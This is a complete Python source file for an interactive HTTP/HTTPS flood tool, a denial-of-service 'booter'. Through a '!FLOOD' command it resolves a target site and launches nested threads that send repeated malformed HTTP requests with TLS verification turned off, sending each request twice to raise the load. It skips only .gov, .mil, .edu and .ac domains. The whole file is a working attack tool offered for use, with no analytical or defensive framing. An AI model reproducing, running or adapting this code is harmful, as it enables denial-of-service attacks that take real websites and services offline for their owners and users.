import socket
import threading
import string
import random
import time
import os
import platform
import sys
import select
import ssl
from colorama import Fore

stop_attack = threading.Event()

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random URL path
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    return "".join(random.sample(msg, int(num)))

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    return ''.join(random.choice(letter) for _ in range(int(num)))

# Attack logic with HTTP/HTTPS support
def DoS_Attack(ip, host, port, protocol, type_attack, booter_sent, data_type_loader_packet):
    if stop_attack.is_set():
        return
    
    path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
    path_get_loader = random.choice(path_get)
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Wrap socket with SSL for HTTPS
    if protocol.lower() == "https":
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False  # Disable hostname verification for testing
        context.verify_mode = ssl.CERT_NONE  # Disable certificate verification for testing
        s = context.wrap_socket(s, server_hostname=host)
    
    try:
        # Payload variations
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: Mozilla/5.0\n\b\n\t\n\n\r\r".encode()
            
        s.connect((ip, port))
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            s.send(packet_data)  # Double send for intensity
        print(f"{Fore.GREEN}Sent packet to {ip}:{port} ({protocol}) with payload {data_type_loader_packet}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error in attack: {e}{Fore.RESET}")
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

def runing_attack(ip, host, port, protocol, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
    while time.time() < time_loader and not stop_attack.is_set():
        for _ in range(spam_loader):
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port, protocol, methods_loader, booter_sent, data_type_loader_packet))
            th.start()

# Countdown with interrupt
def countdown_timer(time_loader):
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()

        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Attack Stopped{Fore.RESET}")
            return

        time.sleep(1)
        remaining = int(time_loader - time.time())

    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Attack Completed{Fore.RESET}")
        stop_attack.set()

# MAIN COMMAND LOOP
def command():
    global stop_attack
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
                stop_attack.set()
                sys.exit(0)

            args_get = data_input_loader.split(" ")
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 11:
                    protocol = args_get[1].lower()  # http or https
                    data_type_loader_packet = args_get[2].upper()
                    target_loader = args_get[3]
                    port_loader = int(args_get[4]) if args_get[4] else (443 if protocol == "https" else 80)
                    time_loader = time.time() + int(args_get[5])
                    spam_loader = int(args_get[6])
                    create_thread = int(args_get[7])
                    booter_sent = int(args_get[8])
                    methods_loader = args_get[9]
                    spam_create_thread = int(args_get[10])

                    if protocol not in ["http", "https"]:
                        print(f"{Fore.RED}Invalid protocol! Use 'http' or 'https'{Fore.RESET}")
                        continue

                    host = ''
                    ip = ''
                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                            continue
                        ip = socket.gethostbyname(host)
                    except socket.gaierror:
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    print(f"{Fore.LIGHTCYAN_EX}Attack Started\n{Fore.YELLOW}Protocol: {protocol}\nTarget: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")

                    for loader_num in range(create_thread):
                        sys.stdout.write(f"\r{Fore.YELLOW}{loader_num} OF {create_thread} CREATE THREAD . . .{Fore.RESET}")
                        sys.stdout.flush()
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, protocol, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()

                    countdown_timer(time_loader)
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <PROTOCOL> <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
